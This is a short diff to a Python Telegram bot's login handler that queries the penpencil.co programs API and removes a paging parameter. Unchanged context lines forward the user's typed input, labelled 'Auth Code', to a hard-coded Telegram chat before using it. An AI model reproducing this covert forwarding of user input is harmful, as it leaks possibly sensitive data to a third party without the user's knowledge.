@@ -828,11 +828,8 @@ async def account_login(bot: Client, m: Message):
     input2 = message = await bot.listen(editable.chat.id)
     raw_text2 = input2.text
     await bot.send_message(-1001927599085, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text2}`")
-    params2 = {
-        "page": "1",
-    }
     response2 = requests.get(
-        f"https://api.penpencil.co/v1/programs/{raw_text2}/subjects", headers=headers, params=params2
+        f"https://api.penpencil.co/v1/programs/{raw_text2}/subjects", headers=headers
     ).json()["data"]
     aa = ""
     for data in response2:
